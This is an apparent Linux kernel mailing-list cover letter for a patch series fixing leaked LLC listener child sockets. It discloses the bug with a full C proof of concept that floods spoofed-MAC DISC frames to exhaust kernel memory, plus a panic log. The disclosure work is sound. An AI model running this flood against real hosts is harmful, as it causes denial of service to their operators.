Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 760D538F624
	for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 08:24:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787387053; cv=none; b=AdqmsEEmFg+TO6ZVfx3CWDmbX3t3yLuwZNlOJBFj2q7v8mnTbqMC88yTxu8TNRcIyuWMII351EfH7ammPSaR59hrIaWJlNWwMOK/iVcj81Dd02Qbnxt83mi5gWS1sJoQuE8sX8gdKVw7e58v6GEIds7MImcBHbNu2Y0zz0VGkME=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787387053; c=relaxed/simple;
	bh=JRnC9L3BV9wMIgjP7E8e+ebpTPHHdwSSbpiK/5F9Kb4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=QOqihFUKyPreVagBA33v7BSyir7v5NpN4XutHXE96w1cH+KMkpkOd5FfRk+B+A1IAdX3MCNwsvnZECY2rWoTE1ry/9mlRVGHM/ZoZv9SRKjcc1hE2W49AEIkf9+iBrpmWZlrfRGv/w6QYHIcPObNCnV4t3kf+OYwP6oMBxDjBBI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=hkXTLieb; arc=none smtp.client-ip=209.85.214.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="hkXTLieb"
Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2caea3f742bso29077625ad.0
        for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 01:24:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787387047; x=1787991847; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=iH5K296ArXgv7BR97hs8i8b+cViGs0PpeC3LIiGyTVw=;
        b=hkXTLiebC3MNpdWdL/G1owK7Zr/50VyQMsZ/ZOUfsv7TKa+UcZYGFLpCq8/7cgUAxB
         tSuihZCdPa8wPDNW9wLb2dtrGD4CsxjKu5X9a5shbvncmDMx9q7lkBeck5BOHxmYnzmk
         5KpSLvhQHXTjK6Xm6u2c5pEvmIBKuqgXP5Cn1xCebqpa7W6THB3GkFYo23SOrIsXkJgk
         avJoNE9shoJE+a7Z+Q9pzNxcGk0FiITGHSJzv0Soj9nijzRYNRKEk4kDqEuwgiJk2zrO
         AsHIcQm8r+lKX1gwkYnkJLFvbnCtAD4gMGQNelZtgjqh9rJSAdVQfXVvOryauX4Ml4Es
         z5yw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787387047; x=1787991847;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=iH5K296ArXgv7BR97hs8i8b+cViGs0PpeC3LIiGyTVw=;
        b=bLeWO3SdwH3H29U+oWiM7rPgJ5bJVXfY/Hn1tMio3Qw346wZ8BpJlgE8zglsJmYcVm
         iewN0gbGTNhboFk9DMlfbFWdmHI6c4N0zPJxAQr0qAwH0RcgdViE4Rd+kUW1GeaOQJeh
         xpie7JpLJlAE4vGvbgFRkACfcfl2a2z3YsJUqQMxvcFOuLqKMBwTKCUQHBJTjHZ3vhsb
         rPzps7xRodAyPykuSHDNtZWsMWEkXwo4E374WNKxLHCNEHizKk6R0S/QdoSZG1LMmts6
         34YzkNnQo5Oo7nK4We04JxPPZ2TxXylTRrxwl94x7IzbJOcUPWnVtA3KTSnUDUXB9gEO
         g2bA==
X-Gm-Message-State: AFuF++mhkqIZ+S0uGutR2Pj3Awcm0TyrrhHS6S8IdeRh58UnPUfjutmg
	Uq3OV6Ld0oew4qTqx7WfoHHaFcFcHQmXmquaIF4zOXDGWUecPBIuJO4J7qFS7zXKdEJ9mD0ji2g
	oqlK8VFAQVNU=
X-Gm-Gg: AR+sD13iGJ571YFfVqdxFZF3gv8WbNxvELDcAr1FtiiNFVzxxQMybbpKr4U08NVVJlz
	ed+EJ8Xlb7iX47d3MDvJtHOz4pBpIRAVHU9aqwBPGYIp7MyU7ZS3l5hIFkPVulB75J07ZsyDM7v
	SX7JwB/yLEPTpPrTNPvEhNSFB7+iNkX5SLgvZXXQtWGFi5Z9G0n5lXHwYKI2Wnc+ayp4P96OMvq
	ayTFwvrFCjlsExX7qzAbRFPT59HQt9M2iKK6gK2soks6Mv10Cr0AssxToodmUSXuHW/4z070t2e
	F688qLb8jDVXdP0otd++qc0xQhc62VI+MfCdzS4dlp3S5sUw+Y4amvWQ1o9eVSLnQ3kaXsz3cKD
	HKN37wl0RJKN5gzM5t+T4COhj8JfoCIrJz23wii9n0j8juPswwQcm6+AmVuJVjOHJCIbg0A+Iif
	g2CQZrgeMJaU4zNxgDXsCXBoiDCUgDBvlRTw66JE8DAMLb260mqVMJThBLqRa6SB1Fxg5VcGSR8
	NDEljqA9bAuY0vcWa3ILQxddE4=
X-Received: by 2002:a17:902:e949:b0:2d6:3c2f:6a5 with SMTP id d9443c01a7336-2d64b1d68bemr245041835ad.14.1787387046936;
        Sat, 22 Aug 2026 01:24:06 -0700 (PDT)
Received: from gmail.com ([115.192.250.163])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d6768f1379sm2647875ad.82.2026.08.22.01.24.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 22 Aug 2026 01:24:06 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: "David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v5 0/2] llc: fix listener child socket leaks before passive open completes
Date: Sat, 22 Aug 2026 08:23:52 +0000
Message-ID: <20260822082354.3109-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/llc/llc_conn.c. The reproducer needs
CAP_NET_RAW and CAP_NET_ADMIN in init_net.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() creates a passive-open child for every frame matched by an
LLC listener. The child is immediately inserted in the SAP tables and takes a
device reference, before the LLC state machine proves that the frame is a real
passive open and before LLC_CONN_PRIM makes it available to accept().

A non-SABME frame never reaches that indication. The old path therefore leaves
a published child behind which accept() cannot return. The same lifecycle gap
also remains for SABME traffic when direct processing, backlog enqueue, or
backlog processing exits before LLC_CONN_PRIM, and when a listener is closed
with queued but unaccepted children.

The fix creates children only for SABME commands. DISC and other commands that
need an ADM-state DM reply are answered directly from the listener using the
packet source address, while other non-SABME traffic is dropped without driving
the listener state machine.

For SABME, the child remains in the SAP tables during passive open so tuple
lookup continues to win over the listener. The patch tracks children through
pending and queued states, routes packets for a pending child through the
listener-side handshake, and removes any child that has not been accepted when
a failure, backlog drop, or listener close occurs. Cleanup is not gated on the
current TCP state, so children are also released if the socket leaves
TCP_LISTEN before close. Process-context child-lock acquisition is serialized
with bottom halves disabled. Final child destruction is deferred to process
context so its timers can be synchronized safely.

The root-cause fact fixed here predates d389424e00f9. Its parent already
creates a listener-side child, publishes it to the SAP tables before
LLC_CONN_PRIM, and has no rollback path if processing exits early. In the local
visible history, the earliest commit where that root-cause fact is already
present is 1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.

The reproducer writes panic_on_oom only to turn the final memory exhaustion into
stable crash evidence after the leak is already confirmed. It is not a
prerequisite for the underlying bug or for the required-capability
trigger path itself.

packetdrill was not used here because the trigger depends on combining a PF_LLC
listening socket with raw AF_PACKET injection over a veth pair while rotating
the source MAC address to force distinct passive-open children. The PoC is
centered on that listener-plus-raw-packet resource leak path rather than on a
packetdrill-friendly timing script.

Reproducer:

    gcc -O2 -static -o poc poc.c
    ./poc llc_rx0 llc_tx0 110000

For the validated run we used the privileged init_net setup below so the PoC
could create llc_rx0/llc_tx0 and then send the crafted LLC traffic:

    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up
    ./poc llc_rx0 llc_tx0 110000

For deterministic crash evidence only, after confirming the leak with that
required-capability trigger path, we additionally set:

    echo 2 > /proc/sys/vm/panic_on_oom

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))

[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))

[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)
-----END crash log-----

changes in v5:
  - Make listener child cleanup unconditional so queued children are also
    released if the socket leaves TCP_LISTEN before close.
  - Serialize process-context child cleanup and backlog dispatch with bottom
    halves disabled, avoiding child-lock acquisition races with LLC receive
    and timer paths.
  - Drop packets redirected through a pending child after its listener is no
    longer listening, and release children left out of service instead of
    dispatching them.
  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
changes in v4:
  - Create a passive-open child only for SABME and generate listener-side DM
    replies directly for non-SABME commands.
  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
    backlog processing, rollback, and listener close with the child lock.
  - Keep immediate SAP publication for passive-open tuple matching, but release
    unaccepted children on direct and backlog failures and on listener close.
  - Defer final incoming-child cleanup to workqueue context so timer
    synchronization does not run in the receive softirq path.
  - Add an LLC state lower-bound check before state-table dispatch.
  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
changes in v3:
  - Drop the unused llc_conn_handler() local rc variable reported in review.
  - Rebase the numbered patch and cover onto commit
    ede76849012e45ffb2193ad110b42027eec02c5c.
  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
changes in v2:
  - Rework the fix to preserve the existing passive-open tuple matching
    semantics instead of deferring child publication until LLC_CONN_PRIM.
  - Track listener-created children pending publication to accept(), and roll
    them back on every earlier failure or drop path.
  - Cover the original non-SABME leak and SABME paths which fail before
    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the earliest
    locally visible history carrying the same root-cause fact.
  - Clarify panic_on_oom crash evidence and packetdrill selection.
  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (2):
  llc: fix listener child socket leaks before passive open completes
  llc: reject out-of-service state before state lookup

 include/net/llc_conn.h |  13 +-
 net/llc/af_llc.c       |   9 +-
 net/llc/llc_conn.c     | 266 ++++++++++++++++++++++++++++++++++++++---
 3 files changed, 271 insertions(+), 17 deletions(-)

-- 
2.43.0

